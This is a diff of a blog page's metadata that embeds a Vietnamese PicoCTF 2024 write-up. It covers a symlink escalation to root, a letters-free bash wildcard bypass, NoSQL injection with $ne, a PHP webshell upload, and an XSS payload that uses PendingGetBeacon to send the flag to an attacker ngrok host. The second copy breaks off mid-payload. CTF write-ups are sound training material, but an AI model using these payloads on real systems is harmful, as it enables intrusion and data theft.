@@ -43,7 +43,7 @@
 <meta property="twitter:title" content="PicoCTF 2024" />
 <meta name="twitter:site" content="@anzuukino" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-03-28T14:48:49+07:00","datePublished":"2024-03-27T23:00:00+07:00","description":"PicoCTF2024 đã kết thúc, giải này mình có khá nhiều nuối tiếc vì bài cuối web quá khó, dù không clear nhưng team Zafk1el tụi mình đã cố gắng hết sức. Tiện đây mình viết writeup một số bài đáng chú ý trong giải này. GENERAL SKILLS: dont-you-love-banners 1 2 3 4 Can you abuse the banner? The server has been leaking some crucial information on tethys.picoctf.net 64560. Use the leaked information to get to the server. To connect to the running application use nc tethys.picoctf.net 64699. From the above information abuse the machine and find the flag in the /root directory. CÁCH 1: symlink Trước hết thì trả lời vài câu hỏi để được vào được shell của player Khi mình vào được shell thì bắt đầu lượn qua các folder, mô tả của bài bảo hãy tìm cách đọc flag ở folder /root nên mình cd đến folder đó để xem Tất nhiên là làm gì có chuyện dễ thế, flag đã bị giới hạn quyền chỉ có root mới có quyền đọc Vậy làm gì bây giờ ? Lúc này mình mới để ý có file script.py nên mình mở lên xem, đây là nội dung file script.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import os import pty incorrect_ans_reply = &quot;Lol, good try, try again and good luck\\n&quot; if __name__ == &quot;__main__&quot;: try: with open(&quot;/home/player/banner&quot;, &quot;r&quot;) as f: print(f.read()) except: print(&quot;*********************************************&quot;) print(&quot;***************DEFAULT BANNER****************&quot;) print(&quot;*Please supply banner in /home/player/banner*&quot;) print(&quot;*********************************************&quot;) try: request = input(&quot;what is the password? \\n&quot;).upper() while request: if request == &#39;MY_PASSW@RD_@1234&#39;: text = input(&quot;What is the top cyber security conference in the world?\\n&quot;).upper() if text == &#39;DEFCON&#39; or text == &#39;DEF CON&#39;: output = input( &quot;the first hacker ever was known for phreaking(making free phone calls), who was it?\\n&quot;).upper() if output == &#39;JOHN DRAPER&#39; or output == &#39;JOHN THOMAS DRAPER&#39; or output == &#39;JOHN&#39; or output== &#39;DRAPER&#39;: scmd = &#39;su - player&#39; pty.spawn(scmd.split(&#39; &#39;)) else: print(incorrect_ans_reply) else: print(incorrect_ans_reply) else: print(incorrect_ans_reply) break except: KeyboardInterrupt Trong file này thì không có gì đáng chú ý trừ 2 điểm File này chạy dưới quyền root File này đọc nội dung 1 tệp tin là /home/player/banner Lúc này thì ta rút ra dùng symlink để /home/player/banner trỏ đển /root/flag.txt và đọc được flag Bây giờ chỉ cần nc lại server thì script.py sẽ tự động đọc flag in ra cho ta CÁCH 2: crack passwork Trong bài này chúng ta ngoài quyền đọc 1 số file mặc định thì chúng ta lại được cấp quyền đọc file /etc/shadow, file này là file quan trọng chứa password của tất cả user ( đã bị mã hoá ) vậy nếu chúng ta có thể decrypt lại thì chúng ta sẽ có password và thăng lên quyền root Về cách crack password thì mình sử dụng tool hashcat để crack ra password Cách này thì mình không đánh giá cao lắm vì nhìn hơi cùi &lt;(“) nhưng mà nó cũng là một cách Funfact: Trong lúc làm bài này mình đã ngẫu nhiên gõ đúng password của root trong ngay lần đầu tiên, sau đó mình mới dùng cách symlink Flag: picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23} GENERAL SKILLS: SansAlpha 1 2 3 The Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols. Additional details will be available after launching your challenge instance. Bài này chặn tất cả các chữ cái và 1 số ký tự đặc biệt, chỉ có thể xài số và các ký tự đặc biệt. Bài này sau một lúc suy nghĩ thì mình nghĩ theo hướng wildcards và tìm ra 2 cách khá hay Cách 1: Sử dụng base32 Sau một lúc fuzzing thì mình tìm thấy file flag.txt ở ./blargh/flag.txt Tiếp theo chúng ta cần tìm cách đọc flag. Để thực thi được lệnh thì trong lệnh đó chỉ có thể có ký tự đặc biệt và số, kết hợp wildcard chúng ta chỉ cần tìm những lệnh có số là được. Sau đó, mình tìm được 2 lệnh có thể dùng được đó là base64 và base32 Nhưng có một vấn đề đó là base64 khi dùng wildcard lại trùng với một tệp thực thi khác /usr/bin/x86_64 vậy thì còn lại base32 có vẻ khả thi Chúng ta có thể dùng wildcard gọi ra file base32 như sau /???/???/????32 và flag thì có địa chỉ ở trên rồi bây giờ kết hợp lại để đọc flag.txt. Decode base32 sex ra flag Cách 2: Sử dụng strings Lúc nãy mình mới nói là chỉ có thể gọi ra file thực thi có số thôi mà lệnh strings thì làm gì có số để mà gọi =))) thật ra là có một cách nhưng cách này chỉ gọi được rất giới hạn Bằng cách tận dụng tham số special bash ta có thể gọi ra một số ký tự, như ở challenge hiện tại chúng ta có dùng $- để gọi ra các ký tự sau &#39;h&#39;, &#39;i&#39;, &#39;m&#39;, &#39;B&#39;, &#39;H&#39;, &#39;s&#39; Giải thích ngắn gọn thì $- là tổng hợp các flag được thiết lập cho shell bash hiện tại, như shell ở trên thì ý nghĩa từng ký tự như sau H - histexpand: Đây là flag cho phép chúng ta lấy những gì chúng ta đã nhập bỏ vào input để tiếp tục thực hiện lệnh, cho phép chúng ta dễ dàng nhập và lặp lại lệnh m - monitor: Đây là flag liên quan đến job control, giúp chúng ta theo dõi các job trong shell h - hashall: Đây là flag được bật lên mặc định, nó giúp lưu trữ các lệnh mà ta thường xài để giúp tăng tốc tốc độ thực thi chương trình B - braceexpand: Đây là flag làm cho shell có thể sử dụng brace expansion i - interactive: Đây là flag khi mà shell có thể tương tác được Có thể đọc thêm tại đây LINK Bây giờ dựa vào đó, chúng ta có thể gán giá trị đó vào một biến khác để dễ dàng sử dụng hơn mình sử dụng biến ____ để lấy giá trị $- Lúc này mình kiểm tra đã gán thành công bây giờ đến bước lấy ký tự trong đó ra bằng ${____:index:len} Sau khi đánh giá các lệnh có thể mình đã chọn lệnh strings để sử dụng, dựa vào các dữ kiện ở trên mình có thể craft được payload như sau /?${____:5:1}?/???/${____:5:1}??${____:1:1}??${____:5:1} (/?s?/???/s??i??s) Lúc này chúng ta gần như có được lệnh ls (fake) và cat (fake) với lệnh này ta có thể đọc bất kỳ file nào nếu biết địa chỉ Đọc flag Flag: picoCTF{7h15_mu171v3r53_15_m4dn355_36a674c0} WEB EXPLOITATION: No Sql Injection 1 2 3 Can you try to get access to this website to get the flag? You can download the source here. The website is running here. Can you log in? App sử dụng MongoDB, sử dụng phương thức POST để gửi giá trị email và password lên Bài này chỉ có 2 chổ cần chú ý Tại /api/login/route.ts có 1 đoạn lệnh như sau 1 2 3 4 5 6 7 8 9 const users = await User.find({ email: email.startsWith(&quot;{&quot;) &amp;&amp; email.endsWith(&quot;}&quot;) ? JSON.parse(email) : email, password: password.startsWith(&quot;{&quot;) &amp;&amp; password.endsWith(&quot;}&quot;) ? JSON.parse(password) : password }); if (users.length &lt; 1) return new Response(&quot;Invalid email or password&quot;, { status: 401 },users); else { return new Response(JSON.stringify(users), { status: 200 }); } Và tại /models/user.ts có đoạn lệnh 1 2 3 4 5 6 7 8 const UserSchema: Schema = new Schema({ email: { type: String, required: true, unique: true }, firstName: { type: String, required: true }, lastName: { type: String, required: true }, password: { type: String, required: true }, token: { type: String, required: false ,default: &quot;&quot;}, }); const User = models.User || mongoose.model&lt;UserInterface&gt;(&quot;User&quot;, UserSchema); Tại route.ts đoạn code sẽ kiểm tra xem nếu biến email và password truyền vào bắt đầu bằng ‘{‘ và kết thúc bằng ‘}’ thì parse cái JSON đó ra còn ngược lại thì truyền vào nguyên giá trị đó và nếu login vào thành công sẽ trả về users Tại user.ts đoạn code trên gán một key là token với value mặc định là FLAG MongoDB thì có thể thêm một số query operator để tạo ra các điều kiện cụ thể để database trả về dữ liệu ứng với điều kiện đó, dựa vào đó ta có thể bắt nó trả về giá trị mà ta mong muốn Vậy chúng ta có thể thêm một query operator $ne để trả về tất cả giá trị không giống với giá trị ta nhập vào Decode token và có được flag Flag: picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_af67328d} WEB EXPLOITATION: Trickster 1 2 I found a web app that can help process images: PNG images only! Additional details will be available after launching your challenge instance. Bài này cho một trang web để upload ảnh png lên, vì đây là một bài blackbox nên mình check /robots.txt xem có gì hot không Có 2 đường dẫn /uploads/ có vẻ đây là nơi sẽ lưu trữ các file mình upload lên /instructions.txt nội dung của nó tóm tắt là nó sẽ cho phép file upload lên có .png trong tên, có header của PNG Upload một vài bức ảnh thì nhận ra backend của web sử dụng PHP nên mình sẽ up file PHP để tạo một cái webshell Có được webshell rồi thì lấy flag thôi Flag: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222} WEB EXPLOITATION: elements 1 Insert Standard Web Challenge Here. Bài này cho một trang web có giao diện như sau Trang web này có chức năng kéo các element vào nhau để tạo ra element mới. Sau khi phân tích qua source code thì có các điều đáng chú ý sau: 1 2 3 4 5 6 7 8 9 10 11 12 const evaluate = (...items) =&gt; { const [a, b] = items.sort(); for (const [ingredientA, ingredientB, result] of recipes) { if (ingredientA === a &amp;&amp; ingredientB == b) { if (result === &#39;XSS&#39; &amp;&amp; state.xss) { eval(state.xss); } return result; } } return null; } Đoạn code này nếu chúng ta tạo ra một element có tên là XSS và có giá trị state.xss thì có thể thực hiện lệnh eval() 1 2 3 4 5 6 7 8 9 10 11 try { state = JSON.parse(atob(window.location.hash.slice(1))); for (const [a, b] of state.recipe) { if (!found.has(a) || !found.has(b)) { break; } const result = evaluate(a, b); found.set(result, elements.get(result)); } } catch(e) {} Đoạn code này sẽ lấy object state bằng cách decode phần sau dấu thăng (fragment identifier) và parse nó sau đó lấy từng giá trị trong state.recipe để craft lên element mới 1 2 3 4 5 6 7 8 9 10 11 12 13 14 const csp = [ &quot;default-src &#39;none&#39;&quot;, &quot;style-src &#39;unsafe-inline&#39;&quot;, &quot;script-src &#39;unsafe-eval&#39; &#39;self&#39;&quot;, &quot;frame-ancestors &#39;none&#39;&quot;, &quot;worker-src &#39;none&#39;&quot;, &quot;navigate-to &#39;none&#39;&quot; ] res.setHeader(&#39;Content-Security-Policy&#39;, csp.join(&#39;; &#39;)); res.setHeader(&#39;Cross-Origin-Opener-Policy&#39;, &#39;same-origin&#39;); res.setHeader(&#39;X-Frame-Options&#39;, &#39;deny&#39;); res.setHeader(&#39;X-Content-Type-Options&#39;, &#39;nosniff&#39;); Đoạn này thì set lần lượt các csp (Content-Security-Policy) để bảo mật trang web giải thích sơ qua Default-src: none : Các nguồn được mặt định là không cho phép từ bất kỳ nguồn nào Style-src : unsafe-inline : Cho phép chèn một inline block style Script-src : unsafe-eval self : Cho phép dùng lệnh eval và dùng các script được tải từ cùng một nguồn frame-ancestors none : Không cho phép các trang web khác nhúng nó vào một frame hay iframe nào đó worker-src &#39;none&#39; : Không cho phép sử dụng Worker để thực thi các lệnh javascript độc lập chạy song song navigate-to &#39;none&#39; : Không cho phép điều hướng trang web 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 state = {...state, flag } await mkdir(join(userDataDir, &#39;Default&#39;)); await writeFile(join(userDataDir, &#39;Default&#39;, &#39;Preferences&#39;), JSON.stringify({ net: { network_prediction_options: 2 } })); const proc = spawn( &#39;/usr/bin/chromium-browser-unstable&#39;, [ `--user-data-dir=${userDataDir}`, &#39;--profile-directory=Default&#39;, &#39;--no-sandbox&#39;, &#39;--js-flags=--noexpose_wasm,--jitless&#39;, &#39;--disable-gpu&#39;, &#39;--no-first-run&#39;, &#39;--enable-experimental-web-platform-features&#39;, `http://127.0.0.1:8080/#${Buffer.from(JSON.stringify(state)).toString(&#39;base64&#39;)}` ], { detached: true } ) Và cuối cùng là đoạn này, khi chúng ta đến đường dẫn /remoteCraft và cho nó 1 parameter recipe thì chúng ta có trigger server đi đến website này với phần fragment identifier là giá trị của object state Có một vài setting đã được thêm vào, đoạn setting này sẽ ngăn không cho tải trước bất kỳ tài nguyên từ mạng nào 1 2 3 4 net: { network_prediction_options: 2 } Sau khi có các dữ kiện, chúng ta có thể nghỉ đến craft recipe sao cho trả về kết quả là XSS và chèn lệnh javascript vào để eval gửi flag về cho chúng ta, mình đã thử rất nhiều cách và tìm được một cách đó là sourceMappingURL nhưng để dùng được cái này thì phải mở được Devtools của chrome nhưng cách này hoàn toàn không được vì dính bảo mật của chrome Sau đó mình thử rất nhiều lệnh vào nhưng không có lệnh nào có thể vượt qua được csp và các setting của chrome trên, đến lúc này thì mình đã bó tay và bỏ cuộc Sau giải khi mình đọc được writeup của satoki thì mình mới biết được rằng chúng ta có thể dùng PendingGetBeacon đây là một chức năng thử nghiệm của chrome (sau này được thay thế bằng fetchLater ở những phiên bản sau này) Giải thích về chức năng của PendingGetBeacon nó sẽ gửi request đến một HTTPS server sau khi browser bị huỷ hoặc đã được lưu vào cache và không được tải lại sau một khoảng thời gian. Nhưng điều đặc biệt nhất, nó không bị dính giới hạn của CSP và có thể dùng để gửi data trong web ra ngoài Ta sẽ thêm một options để send beacon khi mà trang bị huỷ/ không được load sau 1 thời gian nhất định sẽ gửi request lên server bằng {timeout:1000}(sau 1s sẽ gửi) Lúc này thì đã biết được lệnh nào có thể sử dụng được thì đoạn này đã dễ rồi Payload: recipe={&quot;recipe&quot;: [[&quot;Air&quot;, &quot;Water&quot;], [&quot;Earth&quot;, &quot;Water&quot;], [&quot;Earth&quot;, &quot;Fire&quot;], [&quot;Fire&quot;, &quot;Mist&quot;], [&quot;Magma&quot;, &quot;Mud&quot;], [&quot;Fog&quot;, &quot;Mud&quot;], [&quot;Obsidian&quot;, &quot;Water&quot;], [&quot;Hot Spring&quot;, &quot;Sludge&quot;], [&quot;Fire&quot;, &quot;Steam Engine&quot;], [&quot;Air&quot;, &quot;Earth&quot;], [&quot;Earth&quot;, &quot;Obsidian&quot;], [&quot;Hot Spring&quot;, &quot;Steam Engine&quot;], [&quot;Dust&quot;, &quot;Heat Engine&quot;], [&quot;Computer Chip&quot;, &quot;Fire&quot;], [&quot;Computer Chip&quot;, &quot;Steam Engine&quot;], [&quot;Computer Chip&quot;, &quot;Electricity&quot;], [&quot;Magma&quot;, &quot;Mist&quot;], [&quot;Fire&quot;, &quot;Sand&quot;], [&quot;Artificial Intelligence&quot;, &quot;Data&quot;], [&quot;Computer Chip&quot;, &quot;Software&quot;], [&quot;Air&quot;, &quot;Rock&quot;], [&quot;Glass&quot;, &quot;Software&quot;], [&quot;Encryption&quot;, &quot;Software&quot;], [&quot;Internet&quot;, &quot;Program&quot;], [&quot;Cybersecurity&quot;, &quot;Vulnerability&quot;], [&quot;Exploit&quot;, &quot;Web Design&quot;]], &quot;xss&quot;: &quot;new PendingGetBeacon(&#39;https://NGROKSERVER/xxxx/?yuu=&#39; + window.location.hash.slice(1), {timeout: 1000});&quot;} Sau khoảng 1s sẽ nhận được một request đến server của ta Decode và lấy flag Flag: picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a} Fun fact: Bài này sau khi mình hết cứu thì mình đã thực hiện phương thức random bullshit go và bị người anh pro của mình nhắc nhở :&quot;(( may mà không có cái payload nào hack máy mình, hehe cảm ơn anh đã nhắc nhở Lời bạt: Sau giải thì mình cũng học được thêm rất nhiều thứ và được cùng team chơi giải này, mong sau này team mình đạt được thứ hạng cao hơn. Cảm ơn ae (Hidori, Kuro0, fuyosuru, SinsAries) Nguồn Writeup: https://github.com/satoki/ctf_writeups/tree/master/picoCTF_2024","headline":"PicoCTF 2024","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/PicoCTF2024/"},"url":"http://localhost:4000/posts/PicoCTF2024/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-03-28T17:57:23+07:00","datePublished":"2024-03-27T23:00:00+07:00","description":"PicoCTF2024 đã kết thúc, giải này mình có khá nhiều nuối tiếc vì bài cuối web quá khó, dù không clear nhưng team Zafk1el tụi mình đã cố gắng hết sức. Tiện đây mình viết writeup một số bài đáng chú ý trong giải này. GENERAL SKILLS: dont-you-love-banners 1 2 3 4 Can you abuse the banner? The server has been leaking some crucial information on tethys.picoctf.net 64560. Use the leaked information to get to the server. To connect to the running application use nc tethys.picoctf.net 64699. From the above information abuse the machine and find the flag in the /root directory. CÁCH 1: symlink Trước hết thì trả lời vài câu hỏi để được vào được shell của player Khi mình vào được shell thì bắt đầu lượn qua các folder, mô tả của bài bảo hãy tìm cách đọc flag ở folder /root nên mình cd đến folder đó để xem Tất nhiên là làm gì có chuyện dễ thế, flag đã bị giới hạn quyền chỉ có root mới có quyền đọc Vậy làm gì bây giờ ? Lúc này mình mới để ý có file script.py nên mình mở lên xem, đây là nội dung file script.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import os import pty incorrect_ans_reply = &quot;Lol, good try, try again and good luck\\n&quot; if __name__ == &quot;__main__&quot;: try: with open(&quot;/home/player/banner&quot;, &quot;r&quot;) as f: print(f.read()) except: print(&quot;*********************************************&quot;) print(&quot;***************DEFAULT BANNER****************&quot;) print(&quot;*Please supply banner in /home/player/banner*&quot;) print(&quot;*********************************************&quot;) try: request = input(&quot;what is the password? \\n&quot;).upper() while request: if request == &#39;MY_PASSW@RD_@1234&#39;: text = input(&quot;What is the top cyber security conference in the world?\\n&quot;).upper() if text == &#39;DEFCON&#39; or text == &#39;DEF CON&#39;: output = input( &quot;the first hacker ever was known for phreaking(making free phone calls), who was it?\\n&quot;).upper() if output == &#39;JOHN DRAPER&#39; or output == &#39;JOHN THOMAS DRAPER&#39; or output == &#39;JOHN&#39; or output== &#39;DRAPER&#39;: scmd = &#39;su - player&#39; pty.spawn(scmd.split(&#39; &#39;)) else: print(incorrect_ans_reply) else: print(incorrect_ans_reply) else: print(incorrect_ans_reply) break except: KeyboardInterrupt Trong file này thì không có gì đáng chú ý trừ 2 điểm File này chạy dưới quyền root File này đọc nội dung 1 tệp tin là /home/player/banner Lúc này thì ta rút ra dùng symlink để /home/player/banner trỏ đển /root/flag.txt và đọc được flag Bây giờ chỉ cần nc lại server thì script.py sẽ tự động đọc flag in ra cho ta CÁCH 2: crack passwork Trong bài này chúng ta ngoài quyền đọc 1 số file mặc định thì chúng ta lại được cấp quyền đọc file /etc/shadow, file này là file quan trọng chứa password của tất cả user ( đã bị mã hoá ) vậy nếu chúng ta có thể decrypt lại thì chúng ta sẽ có password và thăng lên quyền root Về cách crack password thì mình sử dụng tool hashcat để crack ra password Cách này thì mình không đánh giá cao lắm vì nhìn hơi cùi &lt;(“) nhưng mà nó cũng là một cách Funfact: Trong lúc làm bài này mình đã ngẫu nhiên gõ đúng password của root trong ngay lần đầu tiên, sau đó mình mới dùng cách symlink Flag: picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23} GENERAL SKILLS: SansAlpha 1 2 3 The Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols. Additional details will be available after launching your challenge instance. Bài này chặn tất cả các chữ cái và 1 số ký tự đặc biệt, chỉ có thể xài số và các ký tự đặc biệt. Bài này sau một lúc suy nghĩ thì mình nghĩ theo hướng wildcards và tìm ra 2 cách khá hay Cách 1: Sử dụng base32 Sau một lúc fuzzing thì mình tìm thấy file flag.txt ở ./blargh/flag.txt Tiếp theo chúng ta cần tìm cách đọc flag. Để thực thi được lệnh thì trong lệnh đó chỉ có thể có ký tự đặc biệt và số, kết hợp wildcard chúng ta chỉ cần tìm những lệnh có số là được. Sau đó, mình tìm được 2 lệnh có thể dùng được đó là base64 và base32 Nhưng có một vấn đề đó là base64 khi dùng wildcard lại trùng với một tệp thực thi khác /usr/bin/x86_64 vậy thì còn lại base32 có vẻ khả thi Chúng ta có thể dùng wildcard gọi ra file base32 như sau /???/???/????32 và flag thì có địa chỉ ở trên rồi bây giờ kết hợp lại để đọc flag.txt. Decode base32 sex ra flag Cách 2: Sử dụng strings Lúc nãy mình mới nói là chỉ có thể gọi ra file thực thi có số thôi mà lệnh strings thì làm gì có số để mà gọi =))) thật ra là có một cách nhưng cách này chỉ gọi được rất giới hạn Bằng cách tận dụng tham số special bash ta có thể gọi ra một số ký tự, như ở challenge hiện tại chúng ta có dùng $- để gọi ra các ký tự sau &#39;h&#39;, &#39;i&#39;, &#39;m&#39;, &#39;B&#39;, &#39;H&#39;, &#39;s&#39; Giải thích ngắn gọn thì $- là tổng hợp các flag được thiết lập cho shell bash hiện tại, như shell ở trên thì ý nghĩa từng ký tự như sau H - histexpand: Đây là flag cho phép chúng ta lấy những gì chúng ta đã nhập bỏ vào input để tiếp tục thực hiện lệnh, cho phép chúng ta dễ dàng nhập và lặp lại lệnh m - monitor: Đây là flag liên quan đến job control, giúp chúng ta theo dõi các job trong shell h - hashall: Đây là flag được bật lên mặc định, nó giúp lưu trữ các lệnh mà ta thường xài để giúp tăng tốc tốc độ thực thi chương trình B - braceexpand: Đây là flag làm cho shell có thể sử dụng brace expansion i - interactive: Đây là flag khi mà shell có thể tương tác được Có thể đọc thêm tại đây LINK Bây giờ dựa vào đó, chúng ta có thể gán giá trị đó vào một biến khác để dễ dàng sử dụng hơn mình sử dụng biến ____ để lấy giá trị $- Lúc này mình kiểm tra đã gán thành công bây giờ đến bước lấy ký tự trong đó ra bằng ${____:index:len} Sau khi đánh giá các lệnh có thể mình đã chọn lệnh strings để sử dụng, dựa vào các dữ kiện ở trên mình có thể craft được payload như sau /?${____:5:1}?/???/${____:5:1}??${____:1:1}??${____:5:1} (/?s?/???/s??i??s) Lúc này chúng ta gần như có được lệnh ls (fake) và cat (fake) với lệnh này ta có thể đọc bất kỳ file nào nếu biết địa chỉ Đọc flag Flag: picoCTF{7h15_mu171v3r53_15_m4dn355_36a674c0} WEB EXPLOITATION: No Sql Injection 1 2 3 Can you try to get access to this website to get the flag? You can download the source here. The website is running here. Can you log in? App sử dụng MongoDB, sử dụng phương thức POST để gửi giá trị email và password lên Bài này chỉ có 2 chổ cần chú ý Tại /api/login/route.ts có 1 đoạn lệnh như sau 1 2 3 4 5 6 7 8 9 const users = await User.find({ email: email.startsWith(&quot;{&quot;) &amp;&amp; email.endsWith(&quot;}&quot;) ? JSON.parse(email) : email, password: password.startsWith(&quot;{&quot;) &amp;&amp; password.endsWith(&quot;}&quot;) ? JSON.parse(password) : password }); if (users.length &lt; 1) return new Response(&quot;Invalid email or password&quot;, { status: 401 },users); else { return new Response(JSON.stringify(users), { status: 200 }); } Và tại /models/user.ts có đoạn lệnh 1 2 3 4 5 6 7 8 const UserSchema: Schema = new Schema({ email: { type: String, required: true, unique: true }, firstName: { type: String, required: true }, lastName: { type: String, required: true }, password: { type: String, required: true }, token: { type: String, required: false ,default: &quot;&quot;}, }); const User = models.User || mongoose.model&lt;UserInterface&gt;(&quot;User&quot;, UserSchema); Tại route.ts đoạn code sẽ kiểm tra xem nếu biến email và password truyền vào bắt đầu bằng ‘{‘ và kết thúc bằng ‘}’ thì parse cái JSON đó ra còn ngược lại thì truyền vào nguyên giá trị đó và nếu login vào thành công sẽ trả về users Tại user.ts đoạn code trên gán một key là token với value mặc định là FLAG MongoDB thì có thể thêm một số query operator để tạo ra các điều kiện cụ thể để database trả về dữ liệu ứng với điều kiện đó, dựa vào đó ta có thể bắt nó trả về giá trị mà ta mong muốn Vậy chúng ta có thể thêm một query operator $ne để trả về tất cả giá trị không giống với giá trị ta nhập vào Decode token và có được flag Flag: picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_af67328d} WEB EXPLOITATION: Trickster 1 2 I found a web app that can help process images: PNG images only! Additional details will be available after launching your challenge instance. Bài này cho một trang web để upload ảnh png lên, vì đây là một bài blackbox nên mình check /robots.txt xem có gì hot không Có 2 đường dẫn /uploads/ có vẻ đây là nơi sẽ lưu trữ các file mình upload lên /instructions.txt nội dung của nó tóm tắt là nó sẽ cho phép file upload lên có .png trong tên, có header của PNG Upload một vài bức ảnh thì nhận ra backend của web sử dụng PHP nên mình sẽ up file PHP để tạo một cái webshell Có được webshell rồi thì lấy flag thôi Flag: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222} WEB EXPLOITATION: elements 1 Insert Standard Web Challenge Here. Bài này cho một trang web có giao diện như sau Trang web này có chức năng kéo các element vào nhau để tạo ra element mới. Sau khi phân tích qua source code thì có các điều đáng chú ý sau: 1 2 3 4 5 6 7 8 9 10 11 12 const evaluate = (...items) =&gt; { const [a, b] = items.sort(); for (const [ingredientA, ingredientB, result] of recipes) { if (ingredientA === a &amp;&amp; ingredientB == b) { if (result === &#39;XSS&#39; &amp;&amp; state.xss) { eval(state.xss); } return result; } } return null; } Đoạn code này nếu chúng ta tạo ra một element có tên là XSS và có giá trị state.xss thì có thể thực hiện lệnh eval() 1 2 3 4 5 6 7 8 9 10 11 try { state = JSON.parse(atob(window.location.hash.slice(1))); for (const [a, b] of state.recipe) { if (!found.has(a) || !found.has(b)) { break; } const result = evaluate(a, b); found.set(result, elements.get(result)); } } catch(e) {} Đoạn code này sẽ lấy object state bằng cách decode phần sau dấu thăng (fragment identifier) và parse nó sau đó lấy từng giá trị trong state.recipe để craft lên element mới 1 2 3 4 5 6 7 8 9 10 11 12 13 14 const csp = [ &quot;default-src &#39;none&#39;&quot;, &quot;style-src &#39;unsafe-inline&#39;&quot;, &quot;script-src &#39;unsafe-eval&#39; &#39;self&#39;&quot;, &quot;frame-ancestors &#39;none&#39;&quot;, &quot;worker-src &#39;none&#39;&quot;, &quot;navigate-to &#39;none&#39;&quot; ] res.setHeader(&#39;Content-Security-Policy&#39;, csp.join(&#39;; &#39;)); res.setHeader(&#39;Cross-Origin-Opener-Policy&#39;, &#39;same-origin&#39;); res.setHeader(&#39;X-Frame-Options&#39;, &#39;deny&#39;); res.setHeader(&#39;X-Content-Type-Options&#39;, &#39;nosniff&#39;); Đoạn này thì set lần lượt các csp (Content-Security-Policy) để bảo mật trang web giải thích sơ qua Default-src: none : Các nguồn được mặt định là không cho phép từ bất kỳ nguồn nào Style-src : unsafe-inline : Cho phép chèn một inline block style Script-src : unsafe-eval self : Cho phép dùng lệnh eval và dùng các script được tải từ cùng một nguồn frame-ancestors none : Không cho phép các trang web khác nhúng nó vào một frame hay iframe nào đó worker-src &#39;none&#39; : Không cho phép sử dụng Worker để thực thi các lệnh javascript độc lập chạy song song navigate-to &#39;none&#39; : Không cho phép điều hướng trang web 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 state = {...state, flag } await mkdir(join(userDataDir, &#39;Default&#39;)); await writeFile(join(userDataDir, &#39;Default&#39;, &#39;Preferences&#39;), JSON.stringify({ net: { network_prediction_options: 2 } })); const proc = spawn( &#39;/usr/bin/chromium-browser-unstable&#39;, [ `--user-data-dir=${userDataDir}`, &#39;--profile-directory=Default&#39;, &#39;--no-sandbox&#39;, &#39;--js-flags=--noexpose_wasm,--jitless&#39;, &#39;--disable-gpu&#39;, &#39;--no-first-run&#39;, &#39;--enable-experimental-web-platform-features&#39;, `http://127.0.0.1:8080/#${Buffer.from(JSON.stringify(state)).toString(&#39;base64&#39;)}` ], { detached: true } ) Và cuối cùng là đoạn này, khi chúng ta đến đường dẫn /remoteCraft và cho nó 1 parameter recipe thì chúng ta có trigger server đi đến website này với phần fragment identifier là giá trị của object state Có một vài setting đã được thêm vào, đoạn setting này sẽ ngăn không cho tải trước bất kỳ tài nguyên từ mạng nào 1 2 3 4 net: { network_prediction_options: 2 } Sau khi có các dữ kiện, chúng ta có thể nghỉ đến craft recipe sao cho trả về kết quả là XSS và chèn lệnh javascript vào để eval gửi flag về cho chúng ta, mình đã thử rất nhiều cách và tìm được một cách đó là sourceMappingURL nhưng để dùng được cái này thì phải mở được Devtools của chrome nhưng cách này hoàn toàn không được vì dính bảo mật của chrome Sau đó mình thử rất nhiều lệnh vào nhưng không có lệnh nào có thể vượt qua được csp và các setting của chrome trên, đến lúc này thì mình đã bó tay và bỏ cuộc Sau giải khi mình đọc được writeup của satoki thì mình mới biết được rằng chúng ta có thể dùng PendingGetBeacon đây là một chức năng thử nghiệm của chrome (sau này được thay thế bằng fetchLater ở những phiên bản sau này) Giải thích về chức năng của PendingGetBeacon nó sẽ gửi request đến một HTTPS server sau khi browser bị huỷ hoặc đã được lưu vào cache và không được tải lại sau một khoảng thời gian. Nhưng điều đặc biệt nhất, nó không bị dính giới hạn của CSP và có thể dùng để gửi data trong web ra ngoài Ta sẽ thêm một options để send beacon khi mà trang bị huỷ/ không được load sau 1 thời gian nhất định sẽ gửi request lên server bằng {timeout:1000}(sau 1s sẽ gửi) Lúc này thì đã biết được lệnh nào có thể sử dụng được thì đoạn này đã dễ rồi Payload: recipe={&quot;recipe&quot;: [[&quot;Air&quot;, &quot;Water&quot;], [&quot;Earth&quot;, &quot;Water&quot;], [&quot;Earth&quot;, &quot;Fire&quot;], [&quot;Fire&quot;, &quot;Mist&quot;], [&quot;Magma&quot;, &quot;Mud&quot;], [&quot;Fog&quot;, &quot;Mud&quot;], [&quot;Obsidian&quot;, &quot;Water&quot;], [&quot;Hot Spring&quot;, &quot;Sludge&quot;], [&quot;Fire&quot;, &quot;Steam Engine&quot;], [&quot;Air&quot;, &quot;Earth&quot;], [&quot;Earth&quot;, &quot;Obsidian&quot;], [&quot;Hot Spring&quot;, &quot;Steam Engine&quot;], [&quot;Dust&quot;, &quot;Heat Engine&quot;], [&quot;Computer Chip&quot;, &quot;Fire&quot;], [&quot;Computer Chip&quot;, &quot;Steam Engine&quot;], [&quot;Computer Chip&quot;, &quot;Electricity&quot;], [&quot;Magma&quot;, &quot;Mist&quot;], 